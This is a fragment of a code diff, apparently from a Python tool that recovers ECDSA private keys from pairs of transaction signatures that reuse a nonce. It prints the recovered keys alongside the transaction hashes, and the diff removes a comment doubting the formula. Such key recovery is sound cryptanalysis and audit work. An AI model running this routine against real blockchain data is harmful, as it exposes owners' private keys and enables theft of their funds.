@@ -26,7 +26,6 @@ def solve_pair(sig_info1: SignatureInfo, sig_info2: SignatureInfo):
 
 	k = ((h1 - h2) * mod_inverse(s1 - s2, n)) % n
 
-	# not yet verified, seems to be incorrect
 	private_key = ((s1 * k - h1) * mod_inverse(r, n)) % n
 	print(f"Recovered private key: {private_key}, txn hash: {sig_info1.tx_hash}, {sig_info2.tx_hash}", file=sys.stderr)
 	print(f"{private_key}\t{sig_info1.tx_hash}\t{sig_info1.input_index}\t{sig_info2.tx_hash}\t{sig_info2.input_index}")
